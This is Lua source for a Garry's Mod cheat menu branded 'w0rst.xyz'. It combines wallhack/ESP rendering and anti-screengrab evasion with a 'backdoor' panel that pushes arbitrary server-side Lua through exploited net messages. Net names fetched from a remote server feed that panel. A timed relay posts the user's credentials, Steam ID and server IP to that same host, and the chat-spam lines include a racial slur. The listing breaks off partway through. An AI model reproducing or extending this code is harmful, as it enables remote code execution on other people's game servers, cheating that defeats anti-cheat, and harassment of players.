local wtf = {
    ['INFO'] = "w0rst.xyz - Servers-To-Fuck | ~-~\n"
}; print(wtf['INFO'])

function wtf.gString()
    local s = ""
    for i = 1, math.random(10, 220) do
        s = s .. string.char(math.random(32, 126))
    end

    return s
end

local PhyRainbowHook, FlashSpamHook, UseSpamHook = wtf.gString(), wtf.gString(), wtf.gString()
local PlrRefreshHook, ChatSpamHook, AimbotHook = wtf.gString(), wtf.gString(), wtf.gString()
local AntiRecoilHook, FovHook, BhopHook = wtf.gString(), wtf.gString(), wtf.gString()
local RelayHook, KeyHook, EspHook = wtf.gString(), wtf.gString(), wtf.gString()
local SelectedNet, SelectedPlr = "NONE", "NONE"

local enable = {
    ['Ent3DBox'] = false, ['FlashSpam'] = false, ['PhyRainbow'] = false,
    ['Tracer'] = false, ['Distance'] = false, ['Name'] = false,
    ['Weapon'] = false, ['Wallhack'] = false, ['Chams'] = false,
    ['Box3D'] = false, ['Box2D'] = false, ['Skeleton'] = false,
    ['ChatSpam'] = false, ['EntName'] = false, ['EntDistance'] = false,
    ['Aimbot'] = false, ['AutoFire'] = false, ['AntiRecoil'] = false,
    ['UseSpam'] = false, ['Bhop'] = false
}

local color = {
    ['Tracer'] = Color(255, 255, 255),
    ['Distance'] = Color(255, 255, 255),
    ['Name'] = Color(255, 255, 255),
    ['NameDist'] = Color(255, 255, 255),
    ['Weapon'] = Color(255, 255, 255),
    ['Box2D'] = Color(255, 255, 255),
    ['Box3D'] = Color(255, 255, 255),
    ['Skeleton'] = Color(255, 255, 255),
    ['Chams'] = Color(255, 255, 255),
    ['Entity'] = Color(255, 255, 255),
    ['Fov'] = Color(255, 255, 255)
}

local responses = {
    "w0rst.xyz - best gmod cheat 2021",
    "w0rst.xyz - go register or black",
    "w0rst.xyz - free aimbot + esp",
    "w0rst.xyz - get good get w0rst",
    "w0rst.xyz - get w0rst don't get funnied",
    "w0rst.xyz - wtf happend to the server",
    "w0rst.xyz - $$uff yuh$$",
    "w0rst.xyz - pasted off smeghack~",
    "w0rst.xyz - yung slappa central",
    "w0rst.xyz - true opp-steppas",
    "w0rst.xyz - Vec the holmie",
    "w0rst.xyz - Shoutout nigcord",
    "w0rst.xyz - bhop on fleak no cap",
    "w0rst.xyz - skids want our source",
    "w0rst.xyz - Tapped slave who next??",
    "w0rst.xyz - Our cheat aint ratted",
    "w0rst.xyz - wmenu what??",
    "w0rst.xyz - little fishes take the bait"
}

local function Relay()
    if not file.Exists("w0rst/login.txt", "DATA") then
        local function crash() return crash() end crash()
        return
    end

    local lp = LocalPlayer()
    local UserInfo = string.Split(file.Read("w0rst/login.txt"), ":")
    http.Post("https://w0rst.xyz/api/relay.php", {
        username=UserInfo[1],
        password=UserInfo[2],
        steam_name=lp:Name(),
        steam_id=lp:SteamID(),
        server_name=GetHostName(),
        server_ip=game.GetIPAddress() }, function(b)
        local s = string.Split(b, " ");
        if(s[1] == "a4dF91aE25c2BFD11F879e42") then
            local function crash() return crash() end crash()
        end
    end)
end

local RelayDelay = 0
hook.Add("Think", RelayHook, function()
    if CurTime() < RelayDelay then return end
    RelayDelay = CurTime() + 60
    Relay()
end)

function wtf.CheckNet(str)
    return (_G.util.NetworkStringToID(str) > 0)
end

function wtf.CheckPlr(plr)
    if (plr ~= "NONE" and Player(plr):IsValid() ~= false) then
        SelectedPlr = plr; return true
    else
        wtf.Log("Player Not Selected/Valid")
        wtf.conoutRGB("PLAYER INVALID OR NOT SELECTED")
    end
end

function wtf.CheckWebNets()
    http.Post("https://w0rst.xyz/api/net/view.php", { A0791AfFA0F30EdCee1EdADb = "02C2C6A1Ded7183AeDAA8650" }, function(b)
        local Nets = string.Split(b, " ")
        for k,v in pairs(Nets) do
            if wtf.CheckNet(v) then
                wtf.Log("Net Found: "..v)
                wtf.conoutRGB("NET: "..v)
                SelectedNet=v
            end
        end
    end)
end

function wtf.AddNet(str)
    local UserInfo = string.Split(file.Read("w0rst/login.txt"), ":")
    http.Post("https://w0rst.xyz/api/net/upload.php", { username=UserInfo[1], password=UserInfo[2], net=str }, function(b)
          if b[1] == "0" then
              wtf.Log("Uploaded Net "..str)
          elseif b[1] == "1" then
              wtf.Log("Incorrect Permissions")
          end
    end)
end

function wtf.SendLua(lua)
    if wtf.CheckNet(SelectedNet) then
        _G.net.Start(SelectedNet)
        _G.net.WriteString(lua)
        _G.net.WriteBit(1)
        _G.net.SendToServer()
    else
        wtf.Log("Net Not Selected"); wtf.conoutRGB("Error: Net Not Selected")
    end
end

wtf.Icons, wtf.Materials = {
    V="https://w0rst.xyz/script/images/visuals.png",
    P="https://w0rst.xyz/script/images/players.png",
    B="https://w0rst.xyz/script/images/backdoor.png",
    M="https://w0rst.xyz/script/images/misc.png",
    S="https://w0rst.xyz/script/images/sounds.png",
    A="https://w0rst.xyz/script/images/aimbot.png",
    E="https://w0rst.xyz/script/images/exploits.png"
}, {}

function wtf.Download(filename, url, callback, errorCallback)
    local path = "w0rst/images/" .. filename
    local dPath = "data/" .. path
    if (file.Exists(path, "DATA")) then return callback(dPath) end
    if (not file.IsDir(string.GetPathFromFilename(path), "DATA")) then
        file.CreateDir(string.GetPathFromFilename(path))
    end

    errorCallback = errorCallback or function(reason) end
    http.Fetch(url, function(body, size, headers, code)
    if (code ~= 200) then return errorCallback(code) end
        file.Write(path, body)
        callback(dPath)
    end, errorCallback)
end

function wtf.IconSet(iconUrls, path, cb)
    local set = {}
    local count = 0
    local iconAmt = table.Count(iconUrls)

    for name, url in pairs(iconUrls) do
        wtf.Download((path or "") .. util.CRC(name .. url) .. "." .. string.GetExtensionFromFilename(url), url, function(path)
            set[name] = Material(path, "unlitgeneric"); count = count + 1
        if (count == iconAmt and cb) then cb(set) end
    end)
end return set
end

function wtf.Map(tbl, fn)
  	local new = {}
  	for k, v in pairs(tbl) do
    		new[k] = fn(v, k, tbl)
    end return new
end

wtf.Materials = wtf.IconSet(wtf.Icons, "")
wtf.IconSet(wtf.Map(wtf.Icons, function(v) return end), "",
function(icons) for k, icon in pairs(icons) do wtf.Icons[k].iconMat = icon end end)

surface.CreateFont('Font', {
    font = 'Open Sans', extended = false, size = 20,
    weight = 1000, blursize = 0, scanlines = 0,
    antialias = true, underline = false, italic = false,
    strikeout = false, symbol = false, rotary = false,
    shadow = true, additive = false, outline = false,
})

surface.CreateFont('Sounds', {
    font = 'Marlett', extended = false, size = 17,
    weight = 1000, blursize = 0, scanlines = 0,
    antialias = true, underline = false, italic = false,
    strikeout = false, symbol = false, rotary = false,
    shadow = true, additive = true, outline = true,
})

function wtf.conoutRGB(str)
	local text = {}
	for i = 1, #str do
  		table.insert(text, HSVToColor(i * math.random(2, 10) % 360, 1, 1 ))
  		table.insert(text, string.sub(str, i, i))
	end

	table.insert(text, "\n")
	MsgC(unpack(text))
end

--/ Menu Edited Positions
local LogPosY = 10
local SoundPosX, SoundPosY = 17, 10
local EntOffPosY, EntOnPosY = 5, 5
local BDServerPosY, BDClientPosY = 5, 5
local PlrPosX, PlrPosY = 19, 10

local LogTimer = wtf.gString()
function wtf.Log(str)
    local Frame=vgui.Create("DFrame")
    Frame:SetSize(220,30)
    Frame:SetPos(-300, LogPosY)
    Frame:SetTitle("~w0rst~ "..str)
    Frame:ShowCloseButton(false)
    Frame:SetDraggable(false)
    Frame.Paint = function(s,w,h)
        draw.RoundedBox(0,0,0,w,h,Color(30,30,30,255))
        surface.SetDrawColor(Color(15,15,15, 255))
        surface.DrawOutlinedRect(0,0,s:GetWide(),s:GetTall())
    end

    Frame:MoveTo(5, LogPosY, 1,0,0.5)
    timer.Simple(3, function()
        local x, y = Frame:GetPos()
        Frame:MoveTo(-300, y, 1, 0, 0.5);
        timer.Simple(0.5, function() Frame:Close() end)
    end)

    LogPosY=LogPosY+35
    timer.Remove(LogTimer)
    timer.Create(LogTimer, 3.5, 1, function()
        LogPosY=10
    end)
end

local Menu=vgui.Create("DFrame")
Menu:SetSize(650,620)
Menu:SetTitle("")
Menu:Center()
Menu:MakePopup()
Menu:SetPaintShadow(true)
Menu:ShowCloseButton(false)
Menu:SetDraggable(true)
Menu.Paint = function(self,w,h)
    local rainbow = HSVToColor((CurTime() * 99) % 360, 1, 1)
    draw.RoundedBox(0,0,0,w,h,Color(30, 30, 30, 255))
    surface.SetDrawColor(rainbow.r,rainbow.g,rainbow.b,255)
    surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
end

local MenuCloseButton=vgui.Create("DButton", Menu)
MenuCloseButton:SetText("X")
MenuCloseButton:SetSize(30,30)
MenuCloseButton:SetPos(620,0)
MenuCloseButton.DoClick = function() Menu:Hide() end
MenuCloseButton.Paint = function(self,w,h)
    self:SetTextColor(Color(75,75,75, 105))
    surface.SetDrawColor(Color(0,0,0,0))
    surface.DrawOutlinedRect(0,0,w,h)
end

local Tab=vgui.Create("DFrame", Menu)
Tab:ShowCloseButton(false)
Tab:SetDraggable(false)
Tab:SetTitle("")
Tab:SetSize(620,580)
Tab:SetPos(15, 30)
Tab.Paint = function(self, w, h)
    surface.SetDrawColor(Color(15,15,15,255))
    surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
    draw.RoundedBox(0,0,0,w,h,Color(55, 55, 55, 25))
end

local Background=vgui.Create("HTML", Tab)
Background:SetVisible(true)
Background:SetPos(150, 90)
Background:SetSize(490,390)
Background:SetHTML([[<img src='https://i.imgur.com/OMKLFDr.png' alt='Img' style='width:300px;height:300px;'>]])

local Tabs, TabButtons = {}, {}
local function CreateTabButton(mat, x, y)
    local btn, tab = wtf.gString(), wtf.gString()
    TabButtons[btn]=vgui.Create("DButton", Tab)
    TabButtons[btn]:SetSize(70,70)
    TabButtons[btn]:SetPos(x, y)
    TabButtons[btn]:SetText("")
    TabButtons[btn]:SetMaterial(mat)
    TabButtons[btn].Paint = function(self, w, h) surface.SetDrawColor(Color(0,0,0)) end
    TabButtons[btn].DoClick = function()
        for k, v in pairs(Tabs) do v:Hide() end
        if Tabs[tab]:IsVisible() then Tabs[tab]:Hide()
        else Tabs[tab]:Show() end
    end

    Tabs[tab] = vgui.Create("DFrame", Tab)
    Tabs[tab]:ShowCloseButton(false)
    Tabs[tab]:SetVisible(false)
    Tabs[tab]:SetDraggable(false)
    Tabs[tab]:SetTitle("")
    Tabs[tab]:SetPos(95, 10)
    Tabs[tab]:SetSize(515, 560)
    Tabs[tab].Paint = function(self, w, h)
        draw.RoundedBox(0,0,0,w,h,Color(30,30,30,255))
        surface.SetDrawColor(Color(15,15,15,255))
        surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
    end

    return { Tabs[tab], TabButtons[btn] }
end

local function CreatePanel(tab, width, height, x, y)
    local Pannel=vgui.Create("DScrollPanel", tab)
    Pannel:SetSize(width,height)
    Pannel:SetPos(x, y)
    Pannel:GetVBar():SetWide(0)
    Pannel.Paint = function(self,w,h)
        surface.SetDrawColor(Color(15,15,15,255))
        surface.DrawOutlinedRect(0,0,w,h)
        surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
    end
    return { Pannel }
end

local function CreateButton(name, tab, width, height, x, y, func)
    Button=vgui.Create("DButton", tab)
    Button:SetSize(width, height)
    Button:SetPos(x, y)
    Button:SetText(name)
    Button.DoClick = func
    Button.Paint = function(self, w,h)
        draw.RoundedBox(0,0,0,self:GetWide(),self:GetTall(),Color(35, 35, 35, 255))
        surface.SetDrawColor(40, 40, 40, 255)
        surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
        self:SetTextColor(Color(255,255,255))
    end
end

local function CreateCheckbox(name, tab, x, y, func)
    local Frame=vgui.Create("DFrame", tab)
    Frame:SetSize(110,25)
    Frame:SetPos(x,y)
    Frame:SetDraggable(false)
    Frame:ShowCloseButton(false)
    Frame:SetTitle("")
    Frame.Paint = function(self, w,h)
        draw.RoundedBox(0,0,0,self:GetWide(),self:GetTall(),Color(35, 35, 35, 255))
        surface.SetDrawColor(40, 40, 40, 255)
        surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
    end

    local Checkbox = Frame:Add("DCheckBoxLabel")
    Checkbox:SetPos(5,5)
    Checkbox:SetText(name)
    Checkbox:SetDark(true)
    Checkbox.OnChange = func
    Checkbox.Paint = function(self, w, h)
        self:SetTextColor(Color(255,255,255))
    end
end

local function CreateSlider(name, table, tab, max, min, x, y)
    local Frame=vgui.Create("DFrame", tab)
    Frame:SetSize(110,25)
    Frame:SetPos(x, y)
    Frame:SetDraggable(false)
    Frame:ShowCloseButton(false)
    Frame:SetVisible(true)
    Frame:SetTitle(" ")
    Frame.Paint = function(self, w,h)
        surface.SetDrawColor(Color(15,15,15,255))
        surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
        draw.SimpleText(name, "Default", 7, 5, Color(170,170,170,200))
    end

    local Slider = vgui.Create( "DNumSlider", Frame )
    Slider:SetPos(-30, 5)
    Slider:SetSize(150, 10)
    Slider:SetText("")
    Slider:SetMin(min)
    Slider:SetMax(max)
    Slider:SetDecimals(0)
    Slider:SetValue(table[1])
    Slider.Scratch:SetVisible(false)
    Slider.TextArea:SetTextColor(Color(170,170,170,200))
    Slider.OnValueChanged = function(self, value)
        table[1] = self:GetValue()
    end
end

local function CreateColorSlider(name, color, tab, x, y)
    local Frame=vgui.Create("DFrame", tab)
    Frame:SetSize(120,85)
    Frame:SetPos(x,y)
    Frame:SetDraggable(false)
    Frame:ShowCloseButton(false)
    Frame:SetTitle(name)
    Frame.Paint = function(self, w,h)
        surface.SetDrawColor(Color(15,15,15,255))
        surface.DrawOutlinedRect(0,0,w,h)
        surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
        draw.SimpleText("R:", "Default", 10, 25, Color(170,170,170,200))
        draw.SimpleText("G:", "Default", 10, 45, Color(170,170,170,200))
        draw.SimpleText("B:", "Default", 10, 65, Color(170,170,170,200))
    end

    local ColorR=vgui.Create("DNumSlider", Frame)
    ColorR:SetMin(0);
    ColorR:SetMax(255)
    ColorR:SetSize(180, 10)
    ColorR:SetPos(-50,25)
    ColorR:SetDecimals(0)
    ColorR:SetValue(color.r)
    ColorR.Scratch:SetVisible(false)
    ColorR.TextArea:SetTextColor(Color(170,170,170,200))
    ColorR.OnValueChanged = function(self, value)
        color.r=self:GetValue()
    end

    local ColorG=vgui.Create("DNumSlider", Frame)
    ColorG:SetMin(0);
    ColorG:SetMax(255)
    ColorG:SetSize(180, 10)
    ColorG:SetPos(-50,45)
    ColorG:SetDecimals(0)
    ColorG:SetValue(color.g)
    ColorG.Scratch:SetVisible(false)
    ColorG.TextArea:SetTextColor(Color(170,170,170,200))
    ColorG.OnValueChanged = function(self, value)
        color.g=self:GetValue()
    end

    local ColorB=vgui.Create("DNumSlider", Frame)
    ColorB:SetMin(0);
    ColorB:SetMax(255)
    ColorB:SetSize(180, 10)
    ColorB:SetPos(-50,65)
    ColorB:SetDecimals(0)
    ColorB:SetValue(color.b)
    ColorB.Scratch:SetVisible(false)
    ColorB.TextArea:SetTextColor(Color(170,170,170,200))
    ColorB.OnValueChanged = function(self, value)
        color.b=self:GetValue()
    end

    function Update()
        ColorR:SetValue(color.r)
        ColorG:SetValue(color.g)
        ColorB:SetValue(color.b)
    end

    external = {}
    external['Update'] = Update
    return external
end

--/ Tabs
local VisualsTab = CreateTabButton(wtf.Materials.V, 13, 5)
-- local AimbotTab = CreateTabButton(wtf.Materials.A, 13, 85)
local MiscTab = CreateTabButton(wtf.Materials.M, 13, 85)
local PlayersTab = CreateTabButton(wtf.Materials.P, 13, 165)
local BackdoorTab = CreateTabButton(wtf.Materials.B, 13, 245)
-- local ExploitsTab = CreateTabButton(wtf.Materials.E, 13, 325)
local SoundsTab = CreateTabButton(wtf.Materials.S, 13, 325)

--/ Panels
local PlayerPanel = CreatePanel(PlayersTab[1], 495, 540, 10, 10)
local SoundPanel = CreatePanel(SoundsTab[1], 495, 505, 10, 10)
local ServerBDPanel = CreatePanel(BackdoorTab[1], 225, 300, 20, 15)
local ClientBDPanel = CreatePanel(BackdoorTab[1], 225, 300, 270, 15)
local EntityPanel = CreatePanel(VisualsTab[1], 490, 350, 15, 190)
local EntOffPanel = CreatePanel(EntityPanel[1], 230, 330, 10, 10)
local EntOnPanel = CreatePanel(EntityPanel[1], 230, 330, 250, 10)

--/ ColorSilders
local ColorSliders = {
    CreateColorSlider("Tracer-Editor", color['Tracer'], MiscTab[1], 9, 280),
    CreateColorSlider("Distance-Editor", color['Distance'], MiscTab[1], 134, 280),
    CreateColorSlider("Name-Editor", color['Name'], MiscTab[1], 259, 280),
    CreateColorSlider("Weapon-Editor", color['Weapon'], MiscTab[1], 384, 280),
    CreateColorSlider("Box-2D-Editor", color['Box2D'], MiscTab[1],  9, 370),
    CreateColorSlider("Box-3D-Editor", color['Box3D'], MiscTab[1], 134, 370),
    CreateColorSlider("Skeleton-Editor", color['Skeleton'], MiscTab[1], 259, 370),
    CreateColorSlider("Chams-Editor", color['Chams'], MiscTab[1], 384, 370),
    CreateColorSlider("Entity-Editor", color['Entity'], MiscTab[1], 9, 460),
    CreateColorSlider("Fov-Editor", color['Fov'], MiscTab[1], 134, 460),
    CreateColorSlider("Name/Dist-Editor", color['NameDist'], MiscTab[1], 259, 460)
}

local EntList = {}
local function PopulateEntLists()
    local EntsOn, EntsOff = {}, {}
    function CheckTable(table, value)
        if table ~= nil then
            for i = 1, #table do
                if table[i] == value then
                    return true
                end
            end; return false
        end
    end

    for k, v in pairs(ents.GetAll()) do
        local name = v:GetClass()
        if name ~= "player" and name ~= "viewmodel" then
            if not CheckTable(EntList, name) and not CheckTable(EntsOff, name) then
                CreateButton(name, EntOffPanel[1], 220, 25, 5, EntOffPosY, function()
                    table.insert(EntList, name); ClearLists()
                end);

                table.insert(EntsOff, name)
                EntOffPosY = EntOffPosY + 26
            end

            if CheckTable(EntList, name) and not CheckTable(EntsOn, name) then
                CreateButton(name, EntOnPanel[1], 220, 25, 5, EntOnPosY, function()
                    for i = 1, #EntList do
                        if EntList[i] == name then
                            table.remove(EntList, i)
                        end
                    end; ClearLists()
                end);

                table.insert(EntsOn, name)
                EntOnPosY = EntOnPosY + 26
            end
        end
    end

    function ClearLists()
        EntOffPanel[1]:Clear(); EntOnPanel[1]:Clear()
        EntOffPosY, EntOnPosY = 5, 5
        PopulateEntLists()
    end

    external = {}
    external['Clear'] = ClearLists
    return external
end;

local EntityLists = PopulateEntLists()

local function PopulatePlayers()
    for k,v in pairs(player.GetAll()) do
        local Frame = vgui.Create("DFrame", PlayerPanel[1])
        Frame:SetPos(PlrPosX, PlrPosY)
        Frame:SetSize(145, 140)
        Frame:SetTitle(" ")
        Frame:SetDraggable(false)
        Frame:ShowCloseButton(false)
        Frame.Paint = function(self, w, h)
            surface.SetDrawColor(Color(15,15,15,255))
            surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
            draw.RoundedBox(0,0,0,w,h,Color(55, 55, 55, 25))
        end

        local LabelButton = vgui.Create("DButton", Frame)
        LabelButton:SetText("Select " .. v:Nick())
        LabelButton:SetColor(Color(255,255,255))
        LabelButton:SetSize(115, 30)
        LabelButton:SetPos(15, 100)
        LabelButton.Paint = function(self, w, h)
            draw.RoundedBox(0,0,0,self:GetWide(),self:GetTall(),Color(35, 35, 35, 255))
            surface.SetDrawColor(40, 40, 40, 255)
            surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
            self:SetTextColor(Color(255,255,255))
        end
        LabelButton.DoClick = function()
            if wtf.CheckPlr(v:UserID()) then
                wtf.Log("Player: "..Player(SelectedPlr):Nick().." Selected")
                wtf.conoutRGB("SELECTED PLAYER: "..Player(SelectedPlr):Nick())
            end
        end

        local AvatarFrame = vgui.Create("DFrame", Frame)
        AvatarFrame:SetSize(82, 82)
        AvatarFrame:SetPos(31, 10)
        AvatarFrame:SetTitle(" ")
        AvatarFrame:SetDraggable(false)
        AvatarFrame:ShowCloseButton(false)
        AvatarFrame.Paint = function(self, w, h)
            draw.RoundedBox(0,0,0,w,h,Color(0,0,0, 255))
        end

        local Avatar = vgui.Create( "AvatarImage", AvatarFrame)
        Avatar:SetSize(80, 80)
        Avatar:Center()
        Avatar:SetPlayer(v, 128)
        Avatar.Paint = function(self, w, h)
            draw.RoundedBox( 10, 0, 0, w, h, Color(255,255,255))
        end

        PlrPosX=PlrPosX+155
        if PlrPosX==484 then
            PlrPosX=19
            PlrPosY=PlrPosY+150
        end
    end
end; PopulatePlayers()

local RefreshDelay = 5
hook.Add("Think", PlrRefreshHook, function()
    if CurTime() < RefreshDelay then return end
    RefreshDelay = CurTime() + 5
    PlayerPanel[1]:GetCanvas():Clear()
    PlrPosX, PlrPosY = 19, 10
    PopulatePlayers()
end)

local LuaEditor=vgui.Create("DTextEntry", BackdoorTab[1])
LuaEditor:SetPos(10, 325)
LuaEditor:AllowInput()
LuaEditor:SetSize(495, 185)
LuaEditor:SetValue("Run Lua | Server-Side")
LuaEditor:SetMultiline(true)
LuaEditor.Paint = function(self, w, h)
    surface.SetDrawColor(15, 15, 15, 255)
    surface.DrawOutlinedRect(0, 0, w, h)
    self:DrawTextEntryText(Color(255, 255, 255), Color(20, 20, 150), Color(100, 100, 100))
    self:SetFont('Trebuchet18')
end

local function CreateBDServer(name, func)
    Button=vgui.Create("DButton", ServerBDPanel[1])
    Button:SetSize(195, 30)
    Button:SetPos(15, BDServerPosY)
    Button:SetText(name)
    Button.DoClick = function()
        if SelectedNet ~= "NONE" then func()
        else wtf.Log("No Net Selected") end
    end
    Button.Paint = function(self, w,h)
        draw.RoundedBox(0,0,0,self:GetWide(),self:GetTall(),Color(35, 35, 35, 255))
        surface.SetDrawColor(40, 40, 40, 255)
        surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
        self:SetTextColor(Color(255,255,255))
    end

    BDServerPosY = BDServerPosY + 35
end

local function CreateBDClient(name, func)
    Button=vgui.Create("DButton", ClientBDPanel[1])
    Button:SetSize(195, 30)
    Button:SetPos(12, BDClientPosY)
    Button:SetText(name)
    Button.DoClick = function()
        if wtf.CheckNet(SelectedNet) then
            if wtf.CheckPlr(SelectedPlr) then
                func()
            end
        else
            wtf.Log("No Net Selected")
        end
    end
    Button.Paint = function(self, w,h)
        draw.RoundedBox(0,0,0,self:GetWide(),self:GetTall(),Color(35, 35, 35, 255))
        surface.SetDrawColor(40, 40, 40, 255)
        surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
        self:SetTextColor(Color(255,255,255))
    end

    BDClientPosY = BDClientPosY + 35
end

local Sounds = {
    "Velvet https://w0rst.xyz/script/sounds/egovert-velvet.mp3",
    "MrMoney https://w0rst.xyz/script/sounds/shotgunwilly-mrmoney.mp3",
    "GoLoko https://w0rst.xyz/script/sounds/tyga-goloko.mp3",
    "BadBoy https://w0rst.xyz/script/sounds/yungbae-badboy.mp3",
    "RooDoo https://w0rst.xyz/script/sounds/bbno$-roodoo.mp3",
    "SingleSummer https://w0rst.xyz/script/sounds/gyyps-singleforthesummer.mp3",
    "Quiting https://w0rst.xyz/script/sounds/khary-quitting.mp3",
    "DoubtIt https://w0rst.xyz/script/sounds/kyle-doubtit.mp3",
    "Hex https://w0rst.xyz/script/sounds/80purp-hex.mp3",
    "DownBad https://w0rst.xyz/script/sounds/jcole-downbad.mp3",
    "JustTheTwoOfUs https://w0rst.xyz/script/sounds/groverwashington-justthetwoofus.mp3",
    "StillCreeping https://w0rst.xyz/script/sounds/chuuwee-still-creeping.mp3",
    "BeLazy https://w0rst.xyz/script/sounds/skizzymars-be-lazy.mp3",
    "Hope https://w0rst.xyz/script/sounds/Hope.mp3",
    "Prices https://w0rst.xyz/script/sounds/prices.mp3",
    "51DeadOps https://w0rst.xyz/script/sounds/51deadops.mp3"
}

local function CreateSoundButtons()
    local Loop = table.Count(Sounds)
    for i = 1, Loop do
        local Song = string.Split(Sounds[i], " ") --/ split the name & url
        local Button = vgui.Create("DButton", SoundPanel[1])
        Button:SetSize(145,100)
        Button:SetText(Song[1])
        Button:SetFont("Sounds")
        Button:SetPos(SoundPosX, SoundPosY)
        Button.Paint = function(self, w,h)
            draw.RoundedBox(0,0,0,self:GetWide(),self:GetTall(),Color(35, 35, 35, 255))
            surface.SetDrawColor(40, 40, 40, 255)
            surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
            self:SetTextColor(Color(155,155,155))
        end
        Button.DoClick = function()
            if wtf.CheckNet(SelectedNet) then
                wtf.SendLua([[BroadcastLua("sound.PlayURL(']]..Song[2]..[[','mono',function(station) station:Play() end)")]])
                wtf.Log("Sent Sound: "..Song[1]); wtf.conoutRGB("PLAYED SOUND: "..Song[1])
            else
                wtf.Log("No Net Selected"); wtf.conoutRGB("NO NET SELECTED")
            end
        end
        SoundPosX=SoundPosX+158
        if SoundPosX==491 then
            SoundPosX=17
            SoundPosY=SoundPosY+110
        end
    end
end

local FreeCamera = {
    ['Enabled'] = false,
    ['SetView'] = false
}

FreeCamera.ViewOrigin = Vector(0,0,0)
FreeCamera.ViewAngle = Angle(0,0,0)
FreeCamera.Velocity = Vector(0,0,0)
FreeCamera.Hook = wtf.gString()
FreeCamera.Speed = .97

function FreeCamera.CalcView(ply, origin, angles, fov)
    if not FreeCamera['Enabled'] then return end
    if FreeCamera['SetView'] then
        FreeCamera.ViewOrigin = origin
        FreeCamera.ViewAngle = angles
        FreeCamera['SetView'] = false
    end
    return {
        origin = FreeCamera.ViewOrigin,
        angles = FreeCamera.ViewAngle
    }
end

function FreeCamera.CreateMove(cmd)
    if not FreeCamera['Enabled'] then return end
    local time, sensitivity = FrameTime(), 0.025
    FreeCamera.ViewOrigin = FreeCamera.ViewOrigin + (FreeCamera.Velocity * time)
    FreeCamera.Velocity = FreeCamera.Velocity * FreeCamera.Speed

    FreeCamera.ViewAngle.p = math.Clamp( FreeCamera.ViewAngle.p + (cmd:GetMouseY() * sensitivity), -89, 89)
    FreeCamera.ViewAngle.y = FreeCamera.ViewAngle.y + (cmd:GetMouseX() * -1 * sensitivity)

    local add = Vector(0, 0, 0)
    local angle = FreeCamera.ViewAngle
    if(cmd:KeyDown(IN_FORWARD)) then add = add + angle:Forward() end
    if(cmd:KeyDown(IN_BACK)) then add = add - angle:Forward() end
    if(cmd:KeyDown(IN_MOVERIGHT)) then add = add + angle:Right() end
    if(cmd:KeyDown(IN_MOVELEFT)) then add = add - angle:Right() end
    if(cmd:KeyDown(IN_JUMP)) then add = add + angle:Up() end
    if(cmd:KeyDown(IN_DUCK)) then add = add - angle:Up() end

    add = add:GetNormal() * time * 500
    if (cmd:KeyDown(IN_SPEED)) then add = add * 5 end
    FreeCamera.Velocity = FreeCamera.Velocity + add

    cmd:SetViewAngles(cmd:GetViewAngles())
    cmd:SetForwardMove(0)
    cmd:SetSideMove(0)
    cmd:SetUpMove(0)
end

hook.Add("CalcView", FreeCamera.Hook, FreeCamera.CalcView)
hook.Add("CreateMove", FreeCamera.Hook, FreeCamera.CreateMove)

local AntiScreengrabHook, RenderTarget = wtf.gString(), wtf.gString()
local FakeRenderTarget = GetRenderTarget(RenderTarget..os.time(), ScrW(), ScrH())
hook.Add("RenderScene", AntiScreengrabHook, function(vOrigin, vAngle, vFOV )
    local view = {
        x = 0, y = 0,
        w = ScrW(), h = ScrH(),
        dopostprocess = true,
        origin = vOrigin,
        angles =  vAngle,
        fov = vFOV,
        drawhud = true,
        drawmonitors = true,
        drawviewmodel = true
    }

    render.RenderView(view)
    render.CopyTexture(nil, FakeRenderTarget)

    cam.Start2D()
        hook.Run("AltHUDPaint")
    cam.End2D()

    render.SetRenderTarget(FakeRenderTarget)
    return true
end)

local chams01 = CreateMaterial("a", "VertexLitGeneric", {
    ["$ignorez"] = 1,
    ["$model"] = 1,
    ["$basetexture"] = "models/debug/debugwhite",
})

local chams02 = CreateMaterial("@", "VertexLitGeneric", {
    ["$ignorez"] = 0,
    ["$model"] = 1,
    ["$basetexture"] = "models/debug/debugwhite",
})

wtf.Bones = {
    "ValveBiped.Bip01_Head1", "ValveBiped.Bip01_Neck1", "ValveBiped.Bip01_Spine4",
    "ValveBiped.Bip01_Spine2", "ValveBiped.Bip01_Spine1", "ValveBiped.Bip01_Spine",
    "ValveBiped.Bip01_Pelvis", "ValveBiped.Bip01_R_UpperArm", "ValveBiped.Bip01_R_Forearm",
    "ValveBiped.Bip01_R_Hand", "ValveBiped.Bip01_L_UpperArm", "ValveBiped.Bip01_L_Forearm",
    "ValveBiped.Bip01_L_Hand", "ValveBiped.Bip01_R_Thigh", "ValveBiped.Bip01_R_Calf",
    "ValveBiped.Bip01_R_Foot", "ValveBiped.Bip01_R_Toe0",  "ValveBiped.Bip01_L_Thigh",
    "ValveBiped.Bip01_L_Calf",  "ValveBiped.Bip01_L_Foot", "ValveBiped.Bip01_L_Toe0"
}

hook.Add("AltHUDPaint", EspHook, function()
    for k, v in pairs(ents.GetAll()) do
        local ent = v
        if ent:IsValid() and ent ~= LocalPlayer() and not ent:IsDormant() then
            for k, v in pairs(EntList) do
                if v == ent:GetClass() and ent:GetOwner() ~= LocalPlayer() then
                    if enable['EntName'] and enable['EntDistance'] then
                        local name = ent:GetClass()
                        local position = (ent:GetPos() + Vector(0,0,15)):ToScreen()
                        local distance = math.Round(ent:GetPos():Distance(LocalPlayer():GetPos()))
                        draw.SimpleText(name.." ["..distance.."]", "Default", position.x, position.y, color['Entity'], TEXT_ALIGN_CENTER, TEXT_ALIGN_BOTTOM)
                    end

                    if enable['EntName'] then
                        if not enable['EntDistance'] then
                            local name = ent:GetClass()
                            local position = (ent:GetPos() + Vector(0,0,15)):ToScreen()
                            draw.SimpleText(name, "Default", position.x, position.y, color['Entity'], TEXT_ALIGN_CENTER, TEXT_ALIGN_BOTTOM)
                        end
                    end

